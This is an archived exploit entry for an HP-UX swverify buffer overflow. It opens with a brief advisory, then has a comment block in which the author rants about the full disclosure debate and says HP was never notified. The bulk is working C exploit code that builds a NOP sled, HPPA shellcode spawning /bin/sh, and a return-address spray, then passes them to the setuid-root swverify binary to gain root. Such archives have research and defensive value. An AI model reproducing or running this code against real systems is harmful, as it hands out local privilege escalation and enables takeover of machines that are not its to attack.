// source: https://www.securityfocus.com/bid/3279/info

HP-UX is the UNIX Operating System variant distributed by Hewlett-Packard, available for use on systems of size varying from workgroup servers to enterprise systems.

A problem has been discovered in the operating system that can allow a local user to gain elevated privileges. swverify contains a buffer overflow which is exploitable upon receiving 6039 bytes as an argument. The swverify program is setuid root, which allows a local user to execute code as root, potentially gaining administrative access to the vulnerable system.

/*

  Copyright FOO
  This code may be distributed freely so long as it is kept in its entirety.


http://www.counterpane.com/crypto-gram-0108.html#1

  "I have long said that the Internet is too complex to secure.  One of the
  reasons is that it is too complex to understand."

  "It's the authors of the worm and its variants, eEye for publicizing the
   vulnerability, and especially Microsoft for selling a product with this
   security problem."

Didn't you just say that the Internet is too complex to even understand let
alone secure?  And now it's Microsoft's fault.  How should they be able to
magically know all the answers?  Oh, I know, security is a process...

  "If software companies were held liable for systematic problems in
  its products, just like other industries (remember Firestone tires), we'd
  see a whole lot less of this kind of thing."

Yes, I remember Firestone tires.  Bridgestone/Firestone Inc. sold people
a bunch of faulty tires.  The wheel is certainly not "too complex to
understand".  After all, we've had 5000 years of R&D time; the public
expects products that work right.  Web servers, on the other hand, are
a somewhat newer invention.  Thanks for the phony analogy, Bruce.


  "You can argue that eEye did the right thing by publicizing this
  vulnerability, but I personally am getting a little tired of them adding
  weapons to hackers' arsenals. I support full disclosure and believe that
  it has done a lot to improve security, but eEye is going too far."

I could go into the whole full disclosure debate, but I'd honestly rather
get a root canal.  Instead, I'll just point out how wrong you are.  How can
you support full disclosure and not support eEye fully disclosing this issue
to the public?  More importantly, why do you even care?  The debate is over,
full disclosure died when Jeff Moss started blackhat, bugtraq went corporate,
and @stake bought the scene.  The community at large has already rejected
full disclosure. Anyone who thinks otherwise is naive.  In reality the so
called blackhats find most of the holes and only share them with their
friends.  Everyone can argue the pros and cons of full disclosure and try
to start up hopeless little private 0 day clubs for vendors and "authorized"
researchers until hell freezes over, or Microsoft releases a quality product.
In the end, it's just a bunch of people who don't know, arguing with the
bunch who don't get it.  Blame eEye and Microsoft all you want if it makes
you feel better.  If you bitch at them long enough they might just join the
rest of the real researchers out there who don't do public disclosure and
only report to known and trusted peers.  (read: other blackhats)

The real problem here is that the clueless have convinced themselves that the
computer security underground is nothing more than packs of socially
challenged adolescent boys running around with proof of concept exploit code
written by whitehats.  Some have even deluded themselves into thinking that
they should be the ones who are the gate keepers of vulnerability info.
(Russ Cooper comes to mind.) Congratulations, the war is over.  You won.  The
public is now either defenseless or paying by the hour.

Don't bite the hand that feeds you or you won't get any more scraps from
the table.

I will leave you with this HPUX 11 local root exploit code. /usr/sbin/sw*
are all setuid root by default and all contain buffer overflows. I didn't
bother notifying HP about this at all. I just don't give a fuck.

*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH 10102
#define STACK_OFFSET 0
#define EXTRA 4000
#define HPPA_NOP 0x3902800b //0x0b390280

u_char hppa_shellcode[] =
"\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"
"\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"
"\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff\xff\xff";

u_long get_sp(void)
{
   __asm__("copy %sp,%ret0 \n");
}

int main(int argc, char *argv[])
{
   char buf[BUF_LENGTH+8];
   unsigned long targ_addr,other_addr;
   u_long *long_p;
   u_char *char_p;
   int i, code_length = strlen(hppa_shellcode),dso=STACK_OFFSET,xtra=EXTRA;

   if(argc > 1) dso+=atoi(argv[1]);
   if(argc > 2) xtra+=atoi(argv[2]);

   long_p = (u_long *) buf;

   for (i = 0; i < (BUF_LENGTH - code_length - xtra) / sizeof(u_long); i++)
     *long_p++ = HPPA_NOP;

   char_p = (u_char *) long_p;

   for (i = 0; i < code_length; i++)
     *char_p++ = hppa_shellcode[i];

   targ_addr = get_sp() - dso;

   for (i = 0; i < xtra /4; i++)
   {
      *char_p++ =(targ_addr>>24)&255;
      *char_p++ =(targ_addr>>16)&255;
      *char_p++ =(targ_addr>>8)&255;
      *char_p++ =(targ_addr)&255;
    }

   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",targ_addr,strlen(buf), xtra,dso);
   execl("/usr/sbin/swverify","swverify", buf,(char *) 0);
   perror("execl failed");
   return(-1);
}